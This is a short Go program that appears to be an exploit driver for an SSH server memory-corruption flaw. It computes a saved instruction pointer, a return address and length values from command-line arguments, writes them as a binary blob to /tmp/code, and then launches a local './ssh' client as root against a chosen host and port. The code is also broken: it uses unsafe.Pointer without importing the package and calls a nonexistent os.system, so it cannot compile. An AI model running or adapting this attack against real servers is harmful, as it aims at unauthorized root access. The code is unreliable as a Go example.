package main

import (
	"fmt"
	"os"
	"strconv"
)

const PATH_SSH = "./ssh"

func main() {
	if len(os.Args) < 8 {
		fmt.Printf("\nUsage: %s <saved eip> <count> <packet length> <username length> <host> <port> <h(i)>\n\n", os.Args[0])
		os.Exit(0)
	}

	port, err := strconv.Atoi(os.Args[6])
	if err != nil {
		fmt.Println("Invalid port number")
		os.Exit(1)
	}

	buffer := make([]byte, 28)
	ptr := (*[7]uint32)(unsafe.Pointer(&buffer[0]))[:]
	ptr[0] = 1543007393 + uint32(atoi(os.Args[1]))
	ptr[1] = 0
	ptr[2] = uint32(atoi(os.Args[7]))
	ptr[3] = 0
	ptr[4] = 16520 + uint32(atoi(os.Args[2]))
	ptr[5] = uint32(atoi(os.Args[3]))
	ptr[6] = uint32(atoi(os.Args[4]))

	fmt.Printf("\nSaved Eip: &h + %d\n", 1543007393+uint32(atoi(os.Args[1])))
	fmt.Printf("\nReturn Address: 0x%x\n", (16520+uint32(atoi(os.Args[2])))/8)
	fmt.Printf("\nPacket Length: %d\n", (uint32(atoi(os.Args[3]))+8)&^7)
	fmt.Printf("\nUsername Length: %d\n\n", uint32(atoi(os.Args[4])))

	f, err := os.Create("/tmp/code")
	if err != nil {
		fmt.Println("Unable to create file")
		os.Exit(1)
	}
	defer f.Close()

	if _, err := f.Write(buffer); err != nil {
		fmt.Println("Unable to write to file")
		os.Exit(1)
	}

	ssh := fmt.Sprintf("%s -p %d -v -l root %s", PATH_SSH, port, os.Args[5])
	fmt.Println(ssh)
	if err := os.system(ssh); err != nil {
		fmt.Println("Unable to execute command")
		os.Exit(1)
	}

	os.Exit(0)
}

func atoi(s string) int {
	i, err := strconv.Atoi(s)
	if err != nil {
		fmt.Printf("Invalid argument: %s\n", s)
		os.Exit(1)
	}
	return i
}

